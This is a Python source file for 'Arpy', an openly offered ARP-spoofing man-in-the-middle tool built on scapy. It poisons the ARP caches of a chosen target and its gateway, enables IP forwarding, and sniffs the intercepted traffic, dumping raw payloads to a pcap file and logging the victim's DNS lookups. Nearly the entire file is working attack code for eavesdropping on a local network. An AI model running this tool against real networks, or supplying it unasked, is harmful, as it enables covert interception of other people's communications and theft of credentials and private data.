#!/usr/bin/python

#The MIT License (MIT)

#Copyright (c) 2015 Ivan Viljoen

#Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:

#The above copyright notice and this permission notice shall be included in
#all copies or substantial portions of the Software.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
#THE SOFTWARE.

import scapy.all as scapy
from random import randint
import threading, os, sys, optparse, time

options = optparse.OptionParser(usage='%prog -t <Target IP> -g <Gateway IP> -i <Interface>', description='ARP MiTM Tool')
options.add_option('-t', '--target', type='string', dest='target', help='The Target IP')
options.add_option('-g', '--gateway', type='string', dest='gateway', help='The Gateway')
options.add_option('-i', '--interface', type='string', dest='interface', help='Interface to use')
#Filters
options.add_option('--tcp', action='store_true', dest='tcp', help='Filters out only tcp traffic')
options.add_option('--udp', action='store_true', dest='udp', help='Filters out only udp traffic')
options.add_option('-d', '--destination_port', type='string', dest='d_port', help='Filter for a destination port')
options.add_option('-s', '--source_port', type='string', dest='s_port', help='Filter for a source port')
#Options
options.add_option('--sniff', action="store_true", dest="sniff_pkts", help='Sniff all passing data')
options.add_option('--sniff-dns', action="store_true", dest="dns_sniff", help='Sniff only searched domains')
options.add_option('--sniff-dns-gource', action="store_true", dest="dns_sniff_gource", help='Output target\'s DNS searches in gource format')

options.add_option('-v', action='store_true', dest='verbose', help='Verbose scapy packet print')
opts, args = options.parse_args()

version = '3.15'
target = opts.target
gateway = opts.gateway
interface = opts.interface
dns_sniff = opts.dns_sniff
dns_sniff_gource = opts.dns_sniff_gource
sniff_pkts = opts.sniff_pkts

vthread = []
gwthread = []
layers = []
scapy_filter = {"protocol": None, "dst_port": None, "src_port": None}
random_filename = "/tmp/" + str(randint(10000,99999))

class bcolours:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

class user:
    CURRENT_USER_NAME = os.getlogin()
    CURRENT_USER_ID = os.getuid()

def banner():
    banner = bcolours.OKBLUE + """
     _____
    |  _  |___ ___ _ _
    |     |  _| . | | |
    |__|__|_| |  _|_  |
    MiTM Tool |_| |___|
    v"""+version+ """ -@viljoenivan
            """ + bcolours.ENDC
    return banner

def unprivileged_user_print(username):
    print "\n" + bcolours.FAIL + "You are running this as " + bcolours.WARNING + user.CURRENT_USER_NAME + bcolours.FAIL + " which is not" + bcolours.WARNING + " root." + bcolours.FAIL
    print "Consider running it as root." + bcolours.ENDC

def setup_ipv_forwarding():
    if not dns_sniff_gource:
        print(bcolours.OKBLUE + '[Info] Enabling IP Forwarding...' + bcolours.ENDC)
    os.system('sysctl -w net.inet.ip.forwarding=1 > /dev/null')
    os.system('sudo sysctl -w net.inet.ip.fw.enable=1 > /dev/null ')

def filter_parser():
    if opts.tcp and opts.udp:
        scapy_filter["protocol"] =  ''
    if not (opts.tcp or opts.udp):
        scapy_filter["protocol"] =  ''
    elif opts.tcp or opts.udp:
        scapy_filter["protocol"] = 'tcp and ' if opts.tcp else 'udp and '
    if opts.d_port: scapy_filter["dst_port"] = opts.d_port
    if opts.s_port: scapy_filter["src_port"] = opts.s_port

    final_filter = scapy_filter["protocol"] + '((src host ' + target + ' or dst host ' + target + ')'
    if scapy_filter["dst_port"]:
        final_filter += ' and dst port ' + scapy_filter["dst_port"] + ')'
    elif dns_sniff or dns_sniff_gource:
        final_filter += ' and dst port 53)'
    else:
        final_filter += ')'
    if scapy_filter["src_port"]:
        final_filter += ' and (src port ' + scapy_filter["src_port"] + ')'
    return final_filter

def dnshandle(pkt):
    if dns_sniff_gource:
        sys.stdout = open(random_filename+'parsed_nmap', 'a')
        FQDN = pkt.getlayer(scapy.DNS).qd.qname
        domain = FQDN.split('.')
        print str(time.time())[:-3] + "|" + target + "|A|" + str(domain[1]) + '/' + str(FQDN)
    else:
        if pkt.haslayer(scapy.DNS) and pkt.getlayer(scapy.DNS).qr == 0:
            print(bcolours.OKBLUE + 'Target: ' + pkt.getlayer(scapy.IP).src + ' -> (' + pkt.getlayer(scapy.IP).dst + '/DNS server) has searched for: ' + bcolours.WARNING + pkt.getlayer(scapy.DNS).qd.qname + bcolours.ENDC)

def rawhandle(pkt):
    if sniff_pkts:
        scapy.wrpcap(random_filename+"arpy.pcap",pkt)
        counter = 0
        while counter < 1:
            counter += 1
            layer = pkt.getlayer(counter)
            if layer.haslayer(scapy.Raw) and layer.haslayer(scapy.IP):
                print(bcolours.OKBLUE + '\n[Info] Found the following (' + layer.name + ' layer): ' + layer.src + " -> " + layer.dst + bcolours.ENDC)
                tcpdata = layer.getlayer(scapy.Raw).load
                if not opts.verbose:
                    print tcpdata
                else:
                    print layer.show()
            else:
                break

def poison():
    v = scapy.ARP(pdst=target, psrc=gateway)
    while True:
        try:
            scapy.send(v,verbose=0,inter=1,loop=1)
        except KeyboardInterupt:
            print(bcolours.OKBLUE + '  [Warning] Stopping...' + bcolours.ENDC)
            sys.exit(3)

def gw_poison():
    gw = scapy.ARP(pdst=gateway, psrc=target)
    while True:
        try:
            scapy.send(gw,verbose=0,inter=1,loop=1)
        except KeyboardInterupt:
            print(bcolours.OKBLUE + '  [Warning] Stopping...' + bcolours.ENDC)
            sys.exit(3)

def start_poisen(target, interface, scapy_filter):
    vpoison = threading.Thread(target=poison)
    vpoison.setDaemon(True)
    vthread.append(vpoison)
    vpoison.start()

    gwpoison = threading.Thread(target=gw_poison)
    gwpoison.setDaemon(True)
    gwthread.append(gwpoison)
    gwpoison.start()
    if dns_sniff or dns_sniff_gource:
        pkt = scapy.sniff(iface=interface,filter=scapy_filter,prn=dnshandle)
    else:
        pkt = scapy.sniff(iface=interface,filter=scapy_filter,prn=rawhandle)

def main():
    try:
        if user.CURRENT_USER_ID <> 0:
            unprivileged_user_print(user.CURRENT_USER_NAME)

        if dns_sniff_gource:
            print(bcolours.OKBLUE + '[INFO] For a live gource feed run this command in parallel with this one:' + bcolours.WARNING + '\n\ntail -f ' + random_filename + 'parsed_nmap | tee /dev/stderr | gource -log-format custom -a 1 --file-idle-time 0 -\n\n' + bcolours.ENDC)

        #This check is to see if anything but gource parser is set
        if (not dns_sniff_gource) or (dns_sniff or sniff_pkts):
            print banner()
            #check if we actually have some info
            if target == None or gateway == None and interface == None:
                options.print_help()
                return

            if dns_sniff:
                print(bcolours.OKBLUE + '\n  [Info] Starting DNS Sniffer...\n' + bcolours.ENDC)

            elif sniff_pkts:
                print(bcolours.OKBLUE + '\n  [Info] Starting Sniffer...\n' + bcolours.ENDC)

        if dns_sniff_gource or dns_sniff or sniff_pkts:
            setup_ipv_forwarding()
            print (bcolours.OKBLUE + '[Info] Filter: ' + filter_parser() + bcolours.ENDC)
            while True:
                start_poisen(target, interface, filter_parser())
        else:
            options.print_help()

    except KeyboardInterrupt:
        print(bcolours.WARNING + '  [Warning] Stopping...' + bcolours.ENDC)
        sys.exit(3)

if __name__ == '__main__':
	main()

#TO-DO
#Look at adding sslsplit functions
#Port this to kali
#Integrate multi-processing
